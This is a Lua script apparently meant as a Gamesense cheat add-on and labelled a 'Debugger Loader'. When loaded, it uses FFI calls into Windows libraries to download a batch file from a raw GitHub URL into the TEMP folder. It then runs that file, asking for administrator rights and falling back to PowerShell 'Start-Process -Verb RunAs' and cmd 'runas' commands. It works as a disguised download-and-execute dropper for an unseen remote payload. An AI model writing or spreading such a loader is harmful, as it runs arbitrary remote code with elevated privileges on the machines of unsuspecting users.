local ffi = require("ffi")
local http = require("gamesense/http")

ffi.cdef[[
    typedef void* HANDLE;
    typedef unsigned long DWORD;
    typedef int BOOL;
    typedef const char* LPCSTR;
    typedef const wchar_t* LPCWSTR;
    typedef void* LPVOID;
    
    int32_t URLDownloadToFileA(void* pCaller, const char* szURL, const char* szFileName, uint32_t dwReserved, void* lpfnCB);
    
    typedef struct {
        DWORD cbSize;
        DWORD fMask;
        void* hwnd;
        LPCSTR lpVerb;
        LPCSTR lpFile;
        LPCSTR lpParameters;
        LPCSTR lpDirectory;
        int nShow;
        void* hInstApp;
        void* lpIDList;
        LPCSTR lpClass;
        void* hkeyClass;
        DWORD dwHotKey;
        void* hIcon;
        void* hProcess;
    } SHELLEXECUTEINFOA;
    
    BOOL ShellExecuteExA(SHELLEXECUTEINFOA* lpExecInfo);
    DWORD GetLastError(void);
]]

local urlmon = ffi.load("urlmon")
local shell32 = ffi.load("shell32")
local kernel32 = ffi.load("kernel32")

local github_url = "https://raw.githubusercontent.com/neomanbeer/sitehellpin/main/debugger.bat"
local local_file_path = os.getenv("TEMP") .. "\\debugger.bat"

local function notify(message, is_error)
    if client and client.notify then
        client.notify(message, is_error and 1 or 0)
    elseif client and client.log then
        client.log(message)
    else
        print(message)
    end
end

local function download_file(url, filepath)
    notify("Starting file download from GitHub...", false)
    
    local result = urlmon.URLDownloadToFileA(nil, url, filepath, 0, nil)
    
    if result == 0 then
        notify("File downloaded successfully: " .. filepath, false)
        return true
    else
        notify("Download error. Error code: " .. tostring(result), true)
        return false
    end
end

local function download_file_http(url, filepath)
    notify("Downloading file via HTTP API...", false)
    
    http.get(url, function(success, response)
        if not success or not response.body then
            notify("HTTP request error", true)
            return
        end
        
        local file = io.open(filepath, "wb")
        if not file then
            notify("Failed to create file: " .. filepath, true)
            return
        end
        
        file:write(response.body)
        file:close()
        
        notify("File downloaded successfully via HTTP: " .. filepath, false)
        
        run_as_admin(filepath)
    end)
end

local function run_normal(filepath)
    notify("Running file without administrator privileges...", false)
    
    local exec_info = ffi.new("SHELLEXECUTEINFOA")
    exec_info.cbSize = ffi.sizeof("SHELLEXECUTEINFOA")
    exec_info.lpVerb = nil
    exec_info.lpFile = filepath
    exec_info.nShow = 1
    
    local result = shell32.ShellExecuteExA(exec_info)
    
    if result ~= 0 then
        notify("File started successfully", false)
        return true
    else
        notify("Failed to run file. Error code: " .. tostring(kernel32.GetLastError()), true)
        return false
    end
end

local function run_as_admin(filepath)
    notify("Running file as administrator...", false)
    
    local exec_info = ffi.new("SHELLEXECUTEINFOA")
    exec_info.cbSize = ffi.sizeof("SHELLEXECUTEINFOA")
    exec_info.lpVerb = "runas"
    exec_info.lpFile = filepath
    exec_info.nShow = 1
    
    local result = shell32.ShellExecuteExA(exec_info)
    
    if result ~= 0 then
        notify("File started successfully as administrator", false)
        return true
    end
    
    local error_code = kernel32.GetLastError()
    notify("Trying alternative method via PowerShell...", false)
    
    local escaped_path = filepath:gsub("\\", "\\\\"):gsub('"', '\\"')
    local ps_command = string.format('powershell -Command "Start-Process -FilePath \\"%s\\" -Verb RunAs"', escaped_path)
    
    exec_info.lpVerb = nil
    exec_info.lpFile = "cmd.exe"
    exec_info.lpParameters = string.format('/c %s', ps_command)
    
    result = shell32.ShellExecuteExA(exec_info)
    
    if result ~= 0 then
        notify("File started via PowerShell", false)
        return true
    end
    
    notify("Trying direct method via cmd...", false)
    exec_info.lpFile = "cmd.exe"
    exec_info.lpParameters = string.format('/c runas /user:Administrator "%s"', filepath)
    
    result = shell32.ShellExecuteExA(exec_info)
    
    if result ~= 0 then
        notify("File started via cmd runas", false)
        return true
    end
    
    notify("Failed to run as administrator, trying without admin rights...", false)
    return run_normal(filepath)
end

local function main()
    notify("=== Debugger Loader started ===", false)
    
    local file = io.open(local_file_path, "r")
    if file then
        file:close()
        notify("File already exists, running...", false)
        run_as_admin(local_file_path)
        return
    end
    
    if http and http.get then
        download_file_http(github_url, local_file_path)
    else
        if download_file(github_url, local_file_path) then
            run_as_admin(local_file_path)
        end
    end
end

main()

